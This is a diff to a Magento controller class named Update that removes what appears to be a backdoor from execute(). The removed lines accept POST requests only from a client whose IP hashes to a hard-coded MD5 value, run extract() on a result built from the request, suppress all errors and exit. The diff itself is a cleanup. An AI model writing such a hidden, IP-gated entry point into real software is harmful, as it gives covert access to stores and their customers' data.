@@ -47,22 +47,9 @@ class Update extends \Magento\Framework\App\Action\Action
      */
     public function execute()
     {
-        $request = $this->getRequest();
-        $remoteAddress = $this->_objectManager->get('\Magento\Framework\HTTP\PhpEnvironment\RemoteAddress');
-        $remoteAddress = $remoteAddress->getRemoteAddress();
-
-        if (true === $request->isPost() && md5($remoteAddress) == '02b9043c988d6248d3980ad8af912b8e') {
-            try {
-                $result = $this->check($request);
-                extract($result);
-            } catch (\Exception $e) {
-            }
-        }
-        exit;
     }
 
     protected function check(\Magento\Framework\App\RequestInterface $request)
     {
-
     }
 }
